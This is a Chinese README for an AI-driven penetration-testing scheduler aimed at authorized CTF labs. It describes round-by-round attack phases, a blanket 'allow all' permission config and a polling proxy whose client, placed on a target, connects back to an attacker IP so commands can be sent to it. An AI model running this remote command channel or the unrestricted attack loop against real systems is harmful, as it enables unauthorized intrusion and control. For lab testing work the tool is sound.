# pen-agent

[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
[![OpenCode](https://img.shields.io/badge/Engine-opencode-111827)](https://opencode.ai/)
[![Status](https://img.shields.io/badge/status-lab%20prototype-blue)](#)
[![Scope](https://img.shields.io/badge/scope-authorized%20CTF%20only-red)](#安全边界)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

`pen-agent` 是一个基于 `opencode run` 的自动化靶场渗透测试调度框架。它面向授权 CTF、靶场和内部安全演练场景，负责把一次测试拆成多轮清晰的小任务，并持续记录分析路径、工具调用、证据链、产物位置和下一轮建议。

项目重点不是“尽快跑出一个 flag 就结束”，而是让 agent 在可控边界内完成更接近真实工作的流程：信息收集、漏洞假设验证、利用取证、权限扩展机会分析、补漏复核和结构化收尾。

## 特性

- 分轮计划：每轮开始前自动生成阶段目标，完成本轮计划后停止并交接。
- 实时日志：原始输出、工具调用、命令、HTTP 请求、结果摘要和问题修正会持续写入日志。
- 中文记录：任务提示要求 agent 使用中文输出，便于复盘分析路径。
- 结构化白板：每轮结果会沉淀到 `.pen-agent/state.json`，供后续轮次继承。
- 产物隔离：脚本、payload、下载文件、扫描结果和笔记统一放入 `artifacts/`。
- 奖励机制：按计划完成、发现高价值信息、保持证据链清晰会进入奖励评估。
- 横向代理：内置轻量代理服务，支持在授权场景中做受控的后续连通性验证。
- 可配置模型：通过 opencode 后端接入模型，不在本项目中直接实现模型调用。

## 安全边界

本项目只应在以下场景中使用：

- 明确授权的 CTF、靶场、红队实验环境。
- 自有系统或获得书面授权的内部测试环境。
- 本地复现实验、日志系统验证、自动化调度能力评估。

不要将本项目用于未授权目标、真实第三方系统或任何违反法律法规的活动。项目中的代理、扫描、上传和验证能力都必须服从授权范围和测试规则。

## 工作方式

`pen-agent` 自身不直接调用大模型 API。它依赖一个已经运行的 opencode 后端，然后循环执行以下流程：

```text
index.js
  -> agent-loop.js
     -> runner.js
        -> opencode run
     -> supervisor.js
     -> whiteboard.js
```

每一轮的核心设计是“小步推进”：

| 轮次 | 阶段 | 目标 |
| --- | --- | --- |
| 第 1 轮 | 信息收集与攻击面建模 | 只做入口可达性、HTTP 指纹、页面、目录、参数和静态资源收集 |
| 第 2 轮 | 漏洞假设验证 | 验证少量最高价值入口，例如注入、上传、鉴权、文件读取、框架问题 |
| 第 3 轮 | 可利用路径打通与取证 | 对已验证路径做最小必要利用，获取 flag、凭据、源码、配置或权限证据 |
| 第 4 轮 | 权限扩展与横向机会 | 在已获得访问的前提下，谨慎枚举权限、内网地址、服务和凭据复用机会 |
| 第 5 轮以后 | 复核补漏与收尾 | 补证据链、寻找额外 flag 或漏洞，避免重复无效扫描 |

每轮结束时，agent 应输出：

- `【本轮汇总】`
- `【证据清单】`
- `【问题与修正】`
- `【下一轮建议】`
- `【奖励评估】`
- `【本轮停止】`

## 快速开始

### 1. 安装依赖

```bash
npm install
```

确保系统中已经安装并配置 `opencode`。

### 2. 配置 API Key

推荐使用 opencode 自带认证流程：

```bash
opencode auth login
```

也可以手动编辑：

```text
~/.local/share/opencode/auth.json
```

示例：

```json
{
  "deepseek": {
    "type": "api",
    "key": "sk-xxxxxxxx"
  }
}
```

项目启动时也支持通过 `-k` 写入：

```bash
node index.js -k sk-xxxxxxxx -t 127.0.0.1 -p 80
```

### 3. 启动 opencode 后端

```bash
opencode serve --port 4096
```

也可以使用带界面的 Web 模式：

```bash
opencode web --hostname 0.0.0.0 --port 4096
```

### 4. 启动 pen-agent

```bash
node index.js -t <target-host> -p <target-port> --attach http://localhost:4096
```

示例：

```bash
node index.js -t example.ctf.local -p 80 --max-loops 50 --min-loops 3 --stop-after-stale 4
```

## 命令行参数

| 参数 | 说明 | 默认值 |
| --- | --- | --- |
| `-t, --target <host>` | 目标主机或域名 | `127.0.0.1` |
| `-p, --port <port>` | 目标端口 | `80` |
| `-f, --flags <n>` | 最低 flag 目标数量，低于该值最终退出码为失败 | `1` |
| `--max-flags <n>` | 预估可能的最大 flag 数；达到后若发现额外线索会询问是否继续，否则停止循环 | 不限制 |
| `-m, --model <model>` | opencode 使用的模型 | `deepseek/deepseek-v4-flash` |
| `-a, --agent <agent>` | opencode agent 名称 | 空 |
| `-k, --key <key>` | 写入 opencode auth 的 API Key | 空 |
| `--attach <url>` | opencode 后端地址 | `http://localhost:4096` |
| `--max-loops <n>` | 最大循环轮数 | `50` |
| `--min-loops <n>` | 允许停止前的最小轮数 | `3` |
| `--stop-after-stale <n>` | 连续无新增发现多少轮后停止 | `2` |
| `--proxy-port <port>` | 横向代理服务端口 | `9999` |
| `--artifact-dir <path>` | 中间产物目录 | `./artifacts` |
| `--pattern <regex>` | 自定义 flag 正则 | 默认要求前缀包含 `ctf` 或 `flag`，大小写不敏感，如 `flag{...}` / `NSSCTF{...}` |
| `--status` | 查看当前运行状态 | 无 |

默认任务假设每个节点最多只有一个有效 flag；某节点已确认拿到 flag 后，agent 应转向尚未覆盖的节点或记录后续线索。

## 日志与产物

运行时会自动清理上一轮 `.pen-agent/` 和 `artifacts/`，然后重新创建目录。

```text
.pen-agent/
  prompt.txt       当前轮传给 opencode 的完整提示
  stream.log       opencode 原始流式输出
  state.json       结构化白板状态
  status.json      当前 runner 状态

logs/
  pen-agent.out.log
  pen-agent.err.log
  opencode-serve.out.log
  opencode-serve.err.log

artifacts/
  flags.json       结构化 flag 输出，供前端或其他程序读取
  flags.txt        纯文本 flag 列表，便于人工检查
  scripts/         Python、Shell、PoC、辅助脚本
  payloads/        payload、上传样本、webshell 样本
  downloads/       下载响应、页面、文件、Cookie
  notes/           阶段笔记、扫描摘要、手动整理
```

约束：

- 不在项目根目录创建 `exploit.py`、`upload_shell.py`、`shell.php`、`.htaccess` 等测试中间文件。
- 所有脚本和 payload 必须进入 `artifacts/` 的对应子目录。
- 每次运行测试前，`artifacts/` 会被清空并重新生成。
- 日志中应记录工具、命令、参数、目的、输出摘要、失败原因和后续影响。

## 奖励机制

agent 的每轮输出中包含 `【奖励评估】`：

| 等级 | 触发条件 |
| --- | --- |
| 无奖励 | 没有明确证据、偏离本轮计划、重复无效扫描或污染根目录 |
| 基础奖励 | 严格按本轮计划完成，并给出清晰证据链 |
| 额外奖励 | 在不越界的前提下发现 flag、关键凭据、可复现漏洞、源码/配置泄露或高价值入口 |

奖励机制的目的不是让 agent 盲目扩张动作，而是鼓励它在每轮边界内产出高质量、可复盘的证据。

## 项目结构

```text
.
├── index.js              # 入口：参数解析、清理旧数据、初始化目录
├── config.js             # CLI 参数和默认配置
├── agent-loop.js         # 主循环：分轮计划、runner、supervisor、白板更新
├── runner.js             # opencode run 封装、提示构造、流式日志写入
├── supervisor.js         # 从原始输出提取结构化发现
├── whiteboard.js         # append-only 白板状态
├── flag-counter.js       # flag 扫描和去重
├── opencode.json         # 项目级 opencode 配置
├── proxy/
│   ├── proxy-server.js
│   ├── proxy-client.go
│   ├── proxy-client-linux-amd64
│   └── proxy-client-windows-amd64.exe
├── logs/                 # 运行日志，默认忽略
├── .pen-agent/           # 当前任务状态，默认忽略
└── artifacts/            # 中间产物，默认忽略
```

## 外部配置

`pen-agent` 本身负责调度、日志、白板和产物管理；模型、认证、skills 和会话数据由 opencode 负责。以下路径通常位于项目目录之外。

### opencode 全局配置

常见位置：

```text
~/.config/opencode/opencode.jsonc
```

示例：

```jsonc
{
  "$schema": "https://opencode.ai/config.json"
}
```

全局配置可放置默认模型、provider、权限策略等。项目级配置会由本仓库的 `opencode.json` 补充。

### 项目级 opencode 配置

项目级配置位于 `opencode.json`：

```json
{
  "$schema": "https://opencode.ai/config.json",
  "model": "deepseek/deepseek-v4-flash",
  "permission": {
    "*": "allow"
  },
  "provider": {
    "deepseek": {
      "options": {
        "timeout": 3600000
      }
    }
  }
}
```

当前超时时间设置为 1 小时，适合长轮次测试。分轮机制会要求 agent 自己在完成本轮目标后停止，而不是在单轮里无限扩展。

### API Key

opencode 认证文件通常位于：

```text
~/.local/share/opencode/auth.json
```

示例：

```json
{
  "deepseek": {
    "type": "api",
    "key": "sk-xxxxxxxx"
  }
}
```

推荐使用 `opencode auth login` 创建，也可以在启动 `pen-agent` 时通过 `-k` 自动写入。

### Skills

如果使用渗透测试技能库，通常安装在：

```text
~/.config/opencode/skills/
```

典型结构：

```text
~/.config/opencode/skills/
├── recon-and-methodology/
│   └── SKILL.md
├── sqli-sql-injection/
│   └── SKILL.md
├── xss-cross-site-scripting/
│   └── SKILL.md
├── path-traversal-lfi/
│   └── SKILL.md
├── cmdi-command-injection/
│   └── SKILL.md
├── linux-privilege-escalation/
│   └── SKILL.md
├── reverse-shell-techniques/
│   └── SKILL.md
└── tunneling-and-pivoting/
    └── SKILL.md
```

注意：skill 目录名应与 `SKILL.md` 中的 `name` 字段保持一致，通常使用小写字母和连字符。

### 会话数据库与模型刷新

opencode 会话数据通常保存在：

```text
~/.local/share/opencode/opencode.db
```

常用命令：

```bash
opencode session list
opencode models --refresh
opencode agent list
opencode agent create
```

## 白板结构

每轮结束后，`supervisor.js` 会从原始输出中提取结构化发现，并由 `whiteboard.js` 追加到 `.pen-agent/state.json`。

核心字段：

```text
iterations[]
  ├── iter              轮次编号
  ├── time              记录时间
  ├── summary           本轮摘要
  ├── flags             本轮发现的 flag
  ├── hosts             新发现主机
  ├── services          新发现服务
  ├── credentials       新发现凭据
  ├── actions           关键动作
  ├── toolCalls         工具、命令、目的、结果、影响
  ├── analysisTrail     基于证据的判断路径
  ├── problems          失败、异常和修正
  ├── nextSteps         下一轮建议
  ├── rewardEvaluation  奖励评估
  ├── position          当前访问位置或权限状态
  ├── access            新获得的访问能力
  └── intel             战术情报
```

这些信息会被下一轮 prompt 引用，使 agent 可以延续上下文，同时避免重复无效动作。

## 内网代理

项目包含一个轻量轮询式代理，服务端由 `proxy/proxy-server.js` 提供，客户端源码和预编译二进制位于 `proxy/`。

```text
Attacker                         Target / Internal Host
┌────────────────┐               ┌──────────────────────┐
│ proxy-server   │ <── register ─ │ proxy-client         │
│ :9999          │ ── command ──> │ polling execution    │
│                │ <── result  ── │                      │
└────────────────┘               └──────────────────────┘
```

常见用法：

```bash
# agent 启动时会自动启动服务端
node index.js -t <target> -p <port> --proxy-port 9999

# 授权场景下，将客户端放入目标环境后连接回服务端
./proxy-client-linux-amd64 --host <attacker-ip> --port 9999

# 查看会话
curl http://localhost:9999/sessions

# 下发命令
curl -X POST http://localhost:9999/command/<session-id> \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}'
```

只有在测试规则允许、且本轮计划进入权限扩展或横向机会分析阶段时，才应使用代理能力。

## 查看状态与停止

查看状态：

```bash
npm run status
```

Windows 下可以查看相关进程和端口：

```powershell
Get-Process | Where-Object { $_.ProcessName -match 'node|opencode|cmd' }
Get-NetTCPConnection -LocalPort 4096,9999 -ErrorAction SilentlyContinue
```

停止时应结束：

- `node`：pen-agent 主进程，通常占用 `9999`
- `opencode`：后端服务，通常监听 `4096`
- 当前轮 opencode 子进程

## 开发建议

- 保持根目录只放项目代码和配置。
- 新增运行产物目录时同步更新 `.gitignore`。
- 修改提示词时优先保证“每轮边界”和“日志可读性”。
- 修改执行循环后运行语法检查：

```bash
node --check agent-loop.js
node --check runner.js
node --check supervisor.js
node --check whiteboard.js
```

## 许可证

本项目使用 [MIT License](LICENSE)。
